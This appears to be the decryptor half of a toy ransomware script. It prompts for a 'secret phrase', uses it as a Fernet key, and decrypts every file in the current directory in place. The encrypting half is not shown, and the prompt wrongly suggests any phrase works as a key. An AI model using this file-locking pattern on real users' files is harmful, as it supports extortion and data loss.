import os
from cryptography.fernet import Fernet

b = []
for f in os.listdir():
	if f == "decrypt.py":
		continue
	if os.path.isfile(f):
		b.append(f)

a = input("Enter the secret phrase to decrypt your files: ").encode('utf-8')

for f in b:
	with open(f, "rb") as thefile:
		c = thefile.read()
		c_d = Fernet(a).decrypt(c)
	with open(f, "wb") as thefile:
		thefile.write(c_d)

print("Congrats!!!\nYour files are decrypted.")